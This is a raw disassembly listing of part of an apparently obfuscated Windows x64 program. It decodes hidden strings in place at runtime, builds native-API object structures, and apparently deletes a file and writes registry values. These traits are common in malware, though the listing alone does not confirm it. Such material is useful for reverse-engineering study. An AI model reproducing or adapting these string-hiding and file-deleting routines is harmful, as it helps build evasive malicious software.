   140004aee:	e8 6d 54 00 00       	call   0x140009f60
   140004af3:	4c 8d b5 50 10 00 00 	lea    0x1050(%rbp),%r14
   140004afa:	41 b8 10 02 00 00    	mov    $0x210,%r8d
   140004b00:	4c 89 f1             	mov    %r14,%rcx
   140004b03:	31 d2                	xor    %edx,%edx
   140004b05:	e8 56 55 00 00       	call   0x14000a060
   140004b0a:	80 3d 58 e7 2b 00 00 	cmpb   $0x0,0x2be758(%rip)        # 0x1402c3269
   140004b11:	0f 84 39 29 00 00    	je     0x140007450
   140004b17:	80 3d a4 e7 2b 00 00 	cmpb   $0x0,0x2be7a4(%rip)        # 0x1402c32c2
   140004b1e:	74 3a                	je     0x140004b5a
   140004b20:	f3 0f 7e 05 90 e7 2b 	movq   0x2be790(%rip),%xmm0        # 0x1402c32b8
   140004b27:	00 
   140004b28:	66 0f fd 05 70 6c 00 	paddw  0x6c70(%rip),%xmm0        # 0x14000b7a0
   140004b2f:	00 
   140004b30:	66 0f db 05 28 6b 00 	pand   0x6b28(%rip),%xmm0        # 0x14000b660
   140004b37:	00 
   140004b38:	66 0f d6 05 78 e7 2b 	movq   %xmm0,0x2be778(%rip)        # 0x1402c32b8
   140004b3f:	00 
   140004b40:	8b 05 7a e7 2b 00    	mov    0x2be77a(%rip),%eax        # 0x1402c32c0
   140004b46:	83 c0 45             	add    $0x45,%eax
   140004b49:	0f b6 c0             	movzbl %al,%eax
   140004b4c:	66 89 05 6d e7 2b 00 	mov    %ax,0x2be76d(%rip)        # 0x1402c32c0
   140004b53:	c6 05 68 e7 2b 00 00 	movb   $0x0,0x2be768(%rip)        # 0x1402c32c2
   140004b5a:	48 8d 15 57 e7 2b 00 	lea    0x2be757(%rip),%rdx        # 0x1402c32b8
   140004b61:	4c 89 f1             	mov    %r14,%rcx
   140004b64:	e8 07 54 00 00       	call   0x140009f70
   140004b69:	48 8d 95 10 08 00 00 	lea    0x810(%rbp),%rdx
   140004b70:	4c 89 f1             	mov    %r14,%rcx
   140004b73:	e8 e8 53 00 00       	call   0x140009f60
   140004b78:	48 c7 85 70 14 00 00 	movq   $0x0,0x1470(%rbp)
   140004b7f:	00 00 00 00 
   140004b83:	4c 89 f1             	mov    %r14,%rcx
   140004b86:	e8 f5 53 00 00       	call   0x140009f80
   140004b8b:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140004b92:	01 c0                	add    %eax,%eax
   140004b94:	66 89 8d 72 14 00 00 	mov    %cx,0x1472(%rbp)
   140004b9b:	66 89 85 70 14 00 00 	mov    %ax,0x1470(%rbp)
   140004ba2:	4c 89 b5 78 14 00 00 	mov    %r14,0x1478(%rbp)
   140004ba9:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140004bad:	66 0f 7f 85 40 0e 00 	movdqa %xmm0,0xe40(%rbp)
   140004bb4:	00 
   140004bb5:	66 0f 7f 85 50 0e 00 	movdqa %xmm0,0xe50(%rbp)
   140004bbc:	00 
   140004bbd:	c7 85 40 0e 00 00 30 	movl   $0x30,0xe40(%rbp)
   140004bc4:	00 00 00 
   140004bc7:	c7 85 58 0e 00 00 40 	movl   $0x40,0xe58(%rbp)
   140004bce:	00 00 00 
   140004bd1:	48 8d 85 70 14 00 00 	lea    0x1470(%rbp),%rax
   140004bd8:	48 89 85 50 0e 00 00 	mov    %rax,0xe50(%rbp)
   140004bdf:	66 0f 7f 85 60 0e 00 	movdqa %xmm0,0xe60(%rbp)
   140004be6:	00 
   140004be7:	48 c7 85 40 17 00 00 	movq   $0x0,0x1740(%rbp)
   140004bee:	00 00 00 00 
   140004bf2:	66 0f 7f 85 10 17 00 	movdqa %xmm0,0x1710(%rbp)
   140004bf9:	00 
   140004bfa:	c7 44 24 28 20 00 00 	movl   $0x20,0x28(%rsp)
   140004c01:	00 
   140004c02:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   140004c09:	00 
   140004c0a:	48 8d 8d 40 17 00 00 	lea    0x1740(%rbp),%rcx
   140004c11:	4c 8d bd 40 0e 00 00 	lea    0xe40(%rbp),%r15
   140004c18:	4c 8d 8d 10 17 00 00 	lea    0x1710(%rbp),%r9
   140004c1f:	ba 00 00 11 40       	mov    $0x40110000,%edx
   140004c24:	4d 89 f8             	mov    %r15,%r8
   140004c27:	e8 41 c8 ff ff       	call   0x14000146d
   140004c2c:	85 c0                	test   %eax,%eax
   140004c2e:	78 3b                	js     0x140004c6b
   140004c30:	c6 85 00 17 00 00 01 	movb   $0x1,0x1700(%rbp)
   140004c37:	48 8b 8d 40 17 00 00 	mov    0x1740(%rbp),%rcx
   140004c3e:	c7 44 24 20 0d 00 00 	movl   $0xd,0x20(%rsp)
   140004c45:	00 
   140004c46:	48 8d 95 10 17 00 00 	lea    0x1710(%rbp),%rdx
   140004c4d:	4c 8d 85 00 17 00 00 	lea    0x1700(%rbp),%r8
   140004c54:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140004c5a:	e8 a5 c7 ff ff       	call   0x140001404
   140004c5f:	48 8b 8d 40 17 00 00 	mov    0x1740(%rbp),%rcx
   140004c66:	e8 f3 c7 ff ff       	call   0x14000145e
   140004c6b:	48 c7 85 28 17 00 00 	movq   $0x0,0x1728(%rbp)
   140004c72:	00 00 00 00 
   140004c76:	80 3d 01 e6 2b 00 00 	cmpb   $0x0,0x2be601(%rip)        # 0x1402c327e
   140004c7d:	0f 84 13 28 00 00    	je     0x140007496
   140004c83:	48 8d 9d c0 16 00 00 	lea    0x16c0(%rbp),%rbx
   140004c8a:	80 3d 03 eb 2b 00 00 	cmpb   $0x0,0x2beb03(%rip)        # 0x1402c3794
   140004c91:	0f 84 ca 00 00 00    	je     0x140004d61
   140004c97:	66 0f 6f 05 11 6b 00 	movdqa 0x6b11(%rip),%xmm0        # 0x14000b7b0
   140004c9e:	00 
   140004c9f:	66 0f 6f 0d 89 ea 2b 	movdqa 0x2bea89(%rip),%xmm1        # 0x1402c3730
   140004ca6:	00 
   140004ca7:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004cab:	66 0f 6f 15 6d 69 00 	movdqa 0x696d(%rip),%xmm2        # 0x14000b620
   140004cb2:	00 
   140004cb3:	66 0f db ca          	pand   %xmm2,%xmm1
   140004cb7:	66 0f 7f 0d 71 ea 2b 	movdqa %xmm1,0x2bea71(%rip)        # 0x1402c3730
   140004cbe:	00 
   140004cbf:	66 0f 6f 0d 79 ea 2b 	movdqa 0x2bea79(%rip),%xmm1        # 0x1402c3740
   140004cc6:	00 
   140004cc7:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004ccb:	66 0f db ca          	pand   %xmm2,%xmm1
   140004ccf:	66 0f 7f 0d 69 ea 2b 	movdqa %xmm1,0x2bea69(%rip)        # 0x1402c3740
   140004cd6:	00 
   140004cd7:	66 0f 6f 0d 71 ea 2b 	movdqa 0x2bea71(%rip),%xmm1        # 0x1402c3750
   140004cde:	00 
   140004cdf:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004ce3:	66 0f db ca          	pand   %xmm2,%xmm1
   140004ce7:	66 0f 7f 0d 61 ea 2b 	movdqa %xmm1,0x2bea61(%rip)        # 0x1402c3750
   140004cee:	00 
   140004cef:	66 0f 6f 0d 69 ea 2b 	movdqa 0x2bea69(%rip),%xmm1        # 0x1402c3760
   140004cf6:	00 
   140004cf7:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004cfb:	66 0f db ca          	pand   %xmm2,%xmm1
   140004cff:	66 0f 7f 0d 59 ea 2b 	movdqa %xmm1,0x2bea59(%rip)        # 0x1402c3760
   140004d06:	00 
   140004d07:	66 0f 6f 0d 61 ea 2b 	movdqa 0x2bea61(%rip),%xmm1        # 0x1402c3770
   140004d0e:	00 
   140004d0f:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004d13:	66 0f db ca          	pand   %xmm2,%xmm1
   140004d17:	66 0f 7f 0d 51 ea 2b 	movdqa %xmm1,0x2bea51(%rip)        # 0x1402c3770
   140004d1e:	00 
   140004d1f:	66 0f fd 05 59 ea 2b 	paddw  0x2bea59(%rip),%xmm0        # 0x1402c3780
   140004d26:	00 
   140004d27:	66 0f db c2          	pand   %xmm2,%xmm0
   140004d2b:	66 0f 7f 05 4d ea 2b 	movdqa %xmm0,0x2bea4d(%rip)        # 0x1402c3780
   140004d32:	00 
   140004d33:	8b 05 57 ea 2b 00    	mov    0x2bea57(%rip),%eax        # 0x1402c3790
   140004d39:	83 c0 0d             	add    $0xd,%eax
   140004d3c:	0f b6 c0             	movzbl %al,%eax
   140004d3f:	66 89 05 4a ea 2b 00 	mov    %ax,0x2bea4a(%rip)        # 0x1402c3790
   140004d46:	0f b7 05 45 ea 2b 00 	movzwl 0x2bea45(%rip),%eax        # 0x1402c3792
   140004d4d:	83 c0 0d             	add    $0xd,%eax
   140004d50:	0f b6 c0             	movzbl %al,%eax
   140004d53:	66 89 05 38 ea 2b 00 	mov    %ax,0x2bea38(%rip)        # 0x1402c3792
   140004d5a:	c6 05 33 ea 2b 00 00 	movb   $0x0,0x2bea33(%rip)        # 0x1402c3794
   140004d61:	48 c7 85 e0 16 00 00 	movq   $0x0,0x16e0(%rbp)
   140004d68:	00 00 00 00 
   140004d6c:	4c 8d 35 bd e9 2b 00 	lea    0x2be9bd(%rip),%r14        # 0x1402c3730
   140004d73:	4c 89 f1             	mov    %r14,%rcx
   140004d76:	e8 05 52 00 00       	call   0x140009f80
   140004d7b:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140004d82:	01 c0                	add    %eax,%eax
   140004d84:	66 89 8d e2 16 00 00 	mov    %cx,0x16e2(%rbp)
   140004d8b:	66 89 85 e0 16 00 00 	mov    %ax,0x16e0(%rbp)
   140004d92:	4c 89 b5 e8 16 00 00 	mov    %r14,0x16e8(%rbp)
   140004d99:	c7 85 a0 16 00 00 30 	movl   $0x30,0x16a0(%rbp)
   140004da0:	00 00 00 
   140004da3:	48 c7 85 a8 16 00 00 	movq   $0x0,0x16a8(%rbp)
   140004daa:	00 00 00 00 
   140004dae:	c7 85 b8 16 00 00 40 	movl   $0x40,0x16b8(%rbp)
   140004db5:	00 00 00 
   140004db8:	48 8d 85 e0 16 00 00 	lea    0x16e0(%rbp),%rax
   140004dbf:	48 89 85 b0 16 00 00 	mov    %rax,0x16b0(%rbp)
   140004dc6:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140004dca:	f3 0f 7f 03          	movdqu %xmm0,(%rbx)
   140004dce:	48 8d 8d 28 17 00 00 	lea    0x1728(%rbp),%rcx
   140004dd5:	4c 8d 85 a0 16 00 00 	lea    0x16a0(%rbp),%r8
   140004ddc:	ba 03 00 00 00       	mov    $0x3,%edx
   140004de1:	e8 95 c7 ff ff       	call   0x14000157b
   140004de6:	85 c0                	test   %eax,%eax
   140004de8:	79 35                	jns    0x140004e1f
   140004dea:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140004df1:	00 00 
   140004df3:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140004dfa:	00 
   140004dfb:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004e02:	00 00 
   140004e04:	48 8d 8d 28 17 00 00 	lea    0x1728(%rbp),%rcx
   140004e0b:	4c 8d 85 a0 16 00 00 	lea    0x16a0(%rbp),%r8
   140004e12:	ba 03 00 00 00       	mov    $0x3,%edx
   140004e17:	45 31 c9             	xor    %r9d,%r9d
   140004e1a:	e8 6b c7 ff ff       	call   0x14000158a
   140004e1f:	48 83 bd 28 17 00 00 	cmpq   $0x0,0x1728(%rbp)
   140004e26:	00 
   140004e27:	0f 84 05 01 00 00    	je     0x140004f32
   140004e2d:	c7 85 40 0e 00 00 01 	movl   $0x1,0xe40(%rbp)
   140004e34:	00 00 00 
   140004e37:	80 3d 41 e4 2b 00 00 	cmpb   $0x0,0x2be441(%rip)        # 0x1402c327f
   140004e3e:	0f 84 cd 2e 00 00    	je     0x140007d11
   140004e44:	80 3d 7f e9 2b 00 00 	cmpb   $0x0,0x2be97f(%rip)        # 0x1402c37ca
   140004e4b:	74 78                	je     0x140004ec5
   140004e4d:	66 0f 6f 05 6b 69 00 	movdqa 0x696b(%rip),%xmm0        # 0x14000b7c0
   140004e54:	00 
   140004e55:	66 0f 6f 0d 43 e9 2b 	movdqa 0x2be943(%rip),%xmm1        # 0x1402c37a0
   140004e5c:	00 
   140004e5d:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004e61:	66 0f 6f 15 b7 67 00 	movdqa 0x67b7(%rip),%xmm2        # 0x14000b620
   140004e68:	00 
   140004e69:	66 0f db ca          	pand   %xmm2,%xmm1
   140004e6d:	66 0f 7f 0d 2b e9 2b 	movdqa %xmm1,0x2be92b(%rip)        # 0x1402c37a0
   140004e74:	00 
   140004e75:	66 0f fd 05 33 e9 2b 	paddw  0x2be933(%rip),%xmm0        # 0x1402c37b0
   140004e7c:	00 
   140004e7d:	66 0f db c2          	pand   %xmm2,%xmm0
   140004e81:	66 0f 7f 05 27 e9 2b 	movdqa %xmm0,0x2be927(%rip)        # 0x1402c37b0
   140004e88:	00 
   140004e89:	f3 0f 7e 05 2f e9 2b 	movq   0x2be92f(%rip),%xmm0        # 0x1402c37c0
   140004e90:	00 
   140004e91:	66 0f fd 05 37 69 00 	paddw  0x6937(%rip),%xmm0        # 0x14000b7d0
   140004e98:	00 
   140004e99:	66 0f db 05 bf 67 00 	pand   0x67bf(%rip),%xmm0        # 0x14000b660
   140004ea0:	00 
   140004ea1:	66 0f d6 05 17 e9 2b 	movq   %xmm0,0x2be917(%rip)        # 0x1402c37c0
   140004ea8:	00 
   140004ea9:	b8 89 00 00 00       	mov    $0x89,%eax
   140004eae:	03 05 14 e9 2b 00    	add    0x2be914(%rip),%eax        # 0x1402c37c8
   140004eb4:	0f b6 c0             	movzbl %al,%eax
   140004eb7:	66 89 05 0a e9 2b 00 	mov    %ax,0x2be90a(%rip)        # 0x1402c37c8
   140004ebe:	c6 05 05 e9 2b 00 00 	movb   $0x0,0x2be905(%rip)        # 0x1402c37ca
   140004ec5:	48 c7 85 50 10 00 00 	movq   $0x0,0x1050(%rbp)
   140004ecc:	00 00 00 00 
   140004ed0:	4c 8d 35 c9 e8 2b 00 	lea    0x2be8c9(%rip),%r14        # 0x1402c37a0
   140004ed7:	4c 89 f1             	mov    %r14,%rcx
   140004eda:	e8 a1 50 00 00       	call   0x140009f80
   140004edf:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140004ee6:	01 c0                	add    %eax,%eax
   140004ee8:	66 89 8d 52 10 00 00 	mov    %cx,0x1052(%rbp)
   140004eef:	66 89 85 50 10 00 00 	mov    %ax,0x1050(%rbp)
   140004ef6:	4c 89 b5 58 10 00 00 	mov    %r14,0x1058(%rbp)
   140004efd:	48 8b 8d 28 17 00 00 	mov    0x1728(%rbp),%rcx
   140004f04:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140004f09:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140004f10:	00 
   140004f11:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   140004f18:	45 31 c0             	xor    %r8d,%r8d
   140004f1b:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140004f21:	e8 be c6 ff ff       	call   0x1400015e4
   140004f26:	48 8b 8d 28 17 00 00 	mov    0x1728(%rbp),%rcx
   140004f2d:	e8 2c c5 ff ff       	call   0x14000145e
   140004f32:	80 3d 47 e3 2b 00 00 	cmpb   $0x0,0x2be347(%rip)        # 0x1402c3280
   140004f39:	0f 84 d6 25 00 00    	je     0x140007515
   140004f3f:	80 3d a8 e8 2b 00 00 	cmpb   $0x0,0x2be8a8(%rip)        # 0x1402c37ee
   140004f46:	74 7a                	je     0x140004fc2
   140004f48:	66 0f 6f 05 80 e8 2b 	movdqa 0x2be880(%rip),%xmm0        # 0x1402c37d0
   140004f4f:	00 
   140004f50:	66 0f fd 05 98 68 00 	paddw  0x6898(%rip),%xmm0        # 0x14000b7f0
   140004f57:	00 
   140004f58:	66 0f db 05 c0 66 00 	pand   0x66c0(%rip),%xmm0        # 0x14000b620
   140004f5f:	00 
   140004f60:	66 0f 7f 05 68 e8 2b 	movdqa %xmm0,0x2be868(%rip)        # 0x1402c37d0
   140004f67:	00 
   140004f68:	f3 0f 7e 05 70 e8 2b 	movq   0x2be870(%rip),%xmm0        # 0x1402c37e0
   140004f6f:	00 
   140004f70:	66 0f fd 05 88 68 00 	paddw  0x6888(%rip),%xmm0        # 0x14000b800
   140004f77:	00 
   140004f78:	66 0f db 05 e0 66 00 	pand   0x66e0(%rip),%xmm0        # 0x14000b660
   140004f7f:	00 
   140004f80:	66 0f d6 05 58 e8 2b 	movq   %xmm0,0x2be858(%rip)        # 0x1402c37e0
   140004f87:	00 
   140004f88:	f3 0f 7e 05 58 e8 2b 	movq   0x2be858(%rip),%xmm0        # 0x1402c37e8
   140004f8f:	00 
   140004f90:	66 0f fd 05 78 68 00 	paddw  0x6878(%rip),%xmm0        # 0x14000b810
   140004f97:	00 
   140004f98:	66 0f db 05 f0 66 00 	pand   0x66f0(%rip),%xmm0        # 0x14000b690
   140004f9f:	00 
   140004fa0:	66 0f 7e 05 40 e8 2b 	movd   %xmm0,0x2be840(%rip)        # 0x1402c37e8
   140004fa7:	00 
   140004fa8:	8b 05 3e e8 2b 00    	mov    0x2be83e(%rip),%eax        # 0x1402c37ec
   140004fae:	83 c0 6b             	add    $0x6b,%eax
   140004fb1:	0f b6 c0             	movzbl %al,%eax
   140004fb4:	66 89 05 31 e8 2b 00 	mov    %ax,0x2be831(%rip)        # 0x1402c37ec
   140004fbb:	c6 05 2c e8 2b 00 00 	movb   $0x0,0x2be82c(%rip)        # 0x1402c37ee
   140004fc2:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140004fc7:	4c 8d 0d 02 e8 2b 00 	lea    0x2be802(%rip),%r9        # 0x1402c37d0
   140004fce:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   140004fd5:	b1 01                	mov    $0x1,%cl
   140004fd7:	49 89 f8             	mov    %rdi,%r8
   140004fda:	e8 11 de ff ff       	call   0x140002df0
   140004fdf:	80 3d 9b e2 2b 00 00 	cmpb   $0x0,0x2be29b(%rip)        # 0x1402c3281
   140004fe6:	0f 84 89 25 00 00    	je     0x140007575
   140004fec:	80 3d 27 e8 2b 00 00 	cmpb   $0x0,0x2be827(%rip)        # 0x1402c381a
   140004ff3:	74 78                	je     0x14000506d
   140004ff5:	66 0f 6f 05 23 68 00 	movdqa 0x6823(%rip),%xmm0        # 0x14000b820
   140004ffc:	00 
   140004ffd:	66 0f 6f 0d eb e7 2b 	movdqa 0x2be7eb(%rip),%xmm1        # 0x1402c37f0
   140005004:	00 
   140005005:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140005009:	66 0f 6f 15 0f 66 00 	movdqa 0x660f(%rip),%xmm2        # 0x14000b620
   140005010:	00 
   140005011:	66 0f db ca          	pand   %xmm2,%xmm1
   140005015:	66 0f 7f 0d d3 e7 2b 	movdqa %xmm1,0x2be7d3(%rip)        # 0x1402c37f0
   14000501c:	00 
   14000501d:	66 0f fd 05 db e7 2b 	paddw  0x2be7db(%rip),%xmm0        # 0x1402c3800
   140005024:	00 
   140005025:	66 0f db c2          	pand   %xmm2,%xmm0
   140005029:	66 0f 7f 05 cf e7 2b 	movdqa %xmm0,0x2be7cf(%rip)        # 0x1402c3800
   140005030:	00 
   140005031:	f3 0f 7e 05 d7 e7 2b 	movq   0x2be7d7(%rip),%xmm0        # 0x1402c3810
   140005038:	00 
   140005039:	66 0f fd 05 ef 67 00 	paddw  0x67ef(%rip),%xmm0        # 0x14000b830
   140005040:	00 
   140005041:	66 0f db 05 17 66 00 	pand   0x6617(%rip),%xmm0        # 0x14000b660
   140005048:	00 
   140005049:	66 0f d6 05 bf e7 2b 	movq   %xmm0,0x2be7bf(%rip)        # 0x1402c3810
   140005050:	00 
   140005051:	b8 ad 00 00 00       	mov    $0xad,%eax
   140005056:	03 05 bc e7 2b 00    	add    0x2be7bc(%rip),%eax        # 0x1402c3818
   14000505c:	0f b6 c0             	movzbl %al,%eax
   14000505f:	66 89 05 b2 e7 2b 00 	mov    %ax,0x2be7b2(%rip)        # 0x1402c3818
   140005066:	c6 05 ad e7 2b 00 00 	movb   $0x0,0x2be7ad(%rip)        # 0x1402c381a
   14000506d:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140005072:	4c 8d 0d 77 e7 2b 00 	lea    0x2be777(%rip),%r9        # 0x1402c37f0
   140005079:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   140005080:	b1 01                	mov    $0x1,%cl
   140005082:	49 89 f8             	mov    %rdi,%r8
   140005085:	e8 66 dd ff ff       	call   0x140002df0
   14000508a:	80 3d f1 e1 2b 00 00 	cmpb   $0x0,0x2be1f1(%rip)        # 0x1402c3282
   140005091:	0f 84 0f 25 00 00    	je     0x1400075a6
   140005097:	80 3d a4 e7 2b 00 00 	cmpb   $0x0,0x2be7a4(%rip)        # 0x1402c3842
   14000509e:	74 56                	je     0x1400050f6
   1400050a0:	66 0f 6f 05 98 67 00 	movdqa 0x6798(%rip),%xmm0        # 0x14000b840
   1400050a7:	00 
   1400050a8:	66 0f 6f 0d 70 e7 2b 	movdqa 0x2be770(%rip),%xmm1        # 0x1402c3820
   1400050af:	00 
   1400050b0:	66 0f fd c8          	paddw  %xmm0,%xmm1
   1400050b4:	66 0f 6f 15 64 65 00 	movdqa 0x6564(%rip),%xmm2        # 0x14000b620
   1400050bb:	00 
   1400050bc:	66 0f db ca          	pand   %xmm2,%xmm1
   1400050c0:	66 0f 7f 0d 58 e7 2b 	movdqa %xmm1,0x2be758(%rip)        # 0x1402c3820
   1400050c7:	00 
   1400050c8:	66 0f fd 05 60 e7 2b 	paddw  0x2be760(%rip),%xmm0        # 0x1402c3830
   1400050cf:	00 
   1400050d0:	66 0f db c2          	pand   %xmm2,%xmm0
   1400050d4:	66 0f 7f 05 54 e7 2b 	movdqa %xmm0,0x2be754(%rip)        # 0x1402c3830
   1400050db:	00 
   1400050dc:	8b 05 5e e7 2b 00    	mov    0x2be75e(%rip),%eax        # 0x1402c3840
   1400050e2:	83 c0 69             	add    $0x69,%eax
   1400050e5:	0f b6 c0             	movzbl %al,%eax
   1400050e8:	66 89 05 51 e7 2b 00 	mov    %ax,0x2be751(%rip)        # 0x1402c3840
   1400050ef:	c6 05 4c e7 2b 00 00 	movb   $0x0,0x2be74c(%rip)        # 0x1402c3842
   1400050f6:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400050fb:	4c 8d 0d 1e e7 2b 00 	lea    0x2be71e(%rip),%r9        # 0x1402c3820
   140005102:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   140005109:	b1 01                	mov    $0x1,%cl
   14000510b:	49 89 f8             	mov    %rdi,%r8
   14000510e:	e8 dd dc ff ff       	call   0x140002df0
   140005113:	80 3d 69 e1 2b 00 00 	cmpb   $0x0,0x2be169(%rip)        # 0x1402c3283
   14000511a:	0f 84 b7 24 00 00    	je     0x1400075d7
   140005120:	80 3d 43 e7 2b 00 00 	cmpb   $0x0,0x2be743(%rip)        # 0x1402c386a
   140005127:	74 5a                	je     0x140005183
   140005129:	66 0f 6f 05 1f e7 2b 	movdqa 0x2be71f(%rip),%xmm0        # 0x1402c3850
   140005130:	00 
   140005131:	66 0f fd 05 27 67 00 	paddw  0x6727(%rip),%xmm0        # 0x14000b860
   140005138:	00 
   140005139:	66 0f db 05 df 64 00 	pand   0x64df(%rip),%xmm0        # 0x14000b620
   140005140:	00 
   140005141:	66 0f 7f 05 07 e7 2b 	movdqa %xmm0,0x2be707(%rip)        # 0x1402c3850
   140005148:	00 
   140005149:	f3 0f 7e 05 0f e7 2b 	movq   0x2be70f(%rip),%xmm0        # 0x1402c3860
   140005150:	00 
   140005151:	66 0f fd 05 17 67 00 	paddw  0x6717(%rip),%xmm0        # 0x14000b870
   140005158:	00 
   140005159:	66 0f db 05 ff 64 00 	pand   0x64ff(%rip),%xmm0        # 0x14000b660
   140005160:	00 
   140005161:	66 0f d6 05 f7 e6 2b 	movq   %xmm0,0x2be6f7(%rip)        # 0x1402c3860
   140005168:	00 
   140005169:	8b 05 f9 e6 2b 00    	mov    0x2be6f9(%rip),%eax        # 0x1402c3868
   14000516f:	83 c0 5d             	add    $0x5d,%eax
   140005172:	0f b6 c0             	movzbl %al,%eax
   140005175:	66 89 05 ec e6 2b 00 	mov    %ax,0x2be6ec(%rip)        # 0x1402c3868
   14000517c:	c6 05 e7 e6 2b 00 00 	movb   $0x0,0x2be6e7(%rip)        # 0x1402c386a
   140005183:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140005188:	4c 8d 0d c1 e6 2b 00 	lea    0x2be6c1(%rip),%r9        # 0x1402c3850
   14000518f:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   140005196:	b1 01                	mov    $0x1,%cl
   140005198:	49 89 f8             	mov    %rdi,%r8
   14000519b:	e8 50 dc ff ff       	call   0x140002df0
   1400051a0:	80 3d dd e0 2b 00 00 	cmpb   $0x0,0x2be0dd(%rip)        # 0x1402c3284
   1400051a7:	0f 84 80 24 00 00    	je     0x14000762d
   1400051ad:	80 3d d8 e6 2b 00 00 	cmpb   $0x0,0x2be6d8(%rip)        # 0x1402c388c
   1400051b4:	74 67                	je     0x14000521d
   1400051b6:	66 0f 6f 05 b2 e6 2b 	movdqa 0x2be6b2(%rip),%xmm0        # 0x1402c3870
   1400051bd:	00 
   1400051be:	66 0f fd 05 ca 66 00 	paddw  0x66ca(%rip),%xmm0        # 0x14000b890
   1400051c5:	00 
   1400051c6:	66 0f db 05 52 64 00 	pand   0x6452(%rip),%xmm0        # 0x14000b620
   1400051cd:	00 
   1400051ce:	66 0f 7f 05 9a e6 2b 	movdqa %xmm0,0x2be69a(%rip)        # 0x1402c3870
   1400051d5:	00 
   1400051d6:	f3 0f 7e 05 a2 e6 2b 	movq   0x2be6a2(%rip),%xmm0        # 0x1402c3880
   1400051dd:	00 
   1400051de:	66 0f fd 05 ba 66 00 	paddw  0x66ba(%rip),%xmm0        # 0x14000b8a0
   1400051e5:	00 
   1400051e6:	66 0f db 05 72 64 00 	pand   0x6472(%rip),%xmm0        # 0x14000b660
   1400051ed:	00 
   1400051ee:	66 0f d6 05 8a e6 2b 	movq   %xmm0,0x2be68a(%rip)        # 0x1402c3880
   1400051f5:	00 
   1400051f6:	f3 0f 7e 05 8a e6 2b 	movq   0x2be68a(%rip),%xmm0        # 0x1402c3888
   1400051fd:	00 
   1400051fe:	66 0f fd 05 aa 66 00 	paddw  0x66aa(%rip),%xmm0        # 0x14000b8b0
   140005205:	00 
   140005206:	66 0f db 05 82 64 00 	pand   0x6482(%rip),%xmm0        # 0x14000b690
   14000520d:	00 
   14000520e:	66 0f 7e 05 72 e6 2b 	movd   %xmm0,0x2be672(%rip)        # 0x1402c3888
   140005215:	00 
   140005216:	c6 05 6f e6 2b 00 00 	movb   $0x0,0x2be66f(%rip)        # 0x1402c388c
   14000521d:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140005222:	4c 8d 0d 47 e6 2b 00 	lea    0x2be647(%rip),%r9        # 0x1402c3870
   140005229:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   140005230:	b1 01                	mov    $0x1,%cl
   140005232:	49 89 f8             	mov    %rdi,%r8
   140005235:	e8 b6 db ff ff       	call   0x140002df0
   14000523a:	80 3d 44 e0 2b 00 00 	cmpb   $0x0,0x2be044(%rip)        # 0x1402c3285
   140005241:	0f 84 3d 24 00 00    	je     0x140007684
   140005247:	80 3d b8 e6 2b 00 00 	cmpb   $0x0,0x2be6b8(%rip)        # 0x1402c3906
   14000524e:	0f 84 f5 00 00 00    	je     0x140005349
   140005254:	66 0f 6f 05 64 66 00 	movdqa 0x6664(%rip),%xmm0        # 0x14000b8c0
   14000525b:	00 
   14000525c:	66 0f 6f 15 2c e6 2b 	movdqa 0x2be62c(%rip),%xmm2        # 0x1402c3890
   140005263:	00 
   140005264:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005268:	66 0f 6f 0d b0 63 00 	movdqa 0x63b0(%rip),%xmm1        # 0x14000b620
   14000526f:	00 
   140005270:	66 0f db d1          	pand   %xmm1,%xmm2
   140005274:	66 0f 7f 15 14 e6 2b 	movdqa %xmm2,0x2be614(%rip)        # 0x1402c3890
   14000527b:	00 
   14000527c:	66 0f 6f 15 1c e6 2b 	movdqa 0x2be61c(%rip),%xmm2        # 0x1402c38a0
   140005283:	00 
   140005284:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005288:	66 0f db d1          	pand   %xmm1,%xmm2
   14000528c:	66 0f 7f 15 0c e6 2b 	movdqa %xmm2,0x2be60c(%rip)        # 0x1402c38a0
   140005293:	00 
   140005294:	66 0f 6f 15 14 e6 2b 	movdqa 0x2be614(%rip),%xmm2        # 0x1402c38b0
   14000529b:	00 
   14000529c:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400052a0:	66 0f db d1          	pand   %xmm1,%xmm2
   1400052a4:	66 0f 7f 15 04 e6 2b 	movdqa %xmm2,0x2be604(%rip)        # 0x1402c38b0
   1400052ab:	00 
   1400052ac:	66 0f 6f 15 0c e6 2b 	movdqa 0x2be60c(%rip),%xmm2        # 0x1402c38c0
   1400052b3:	00 
   1400052b4:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400052b8:	66 0f db d1          	pand   %xmm1,%xmm2
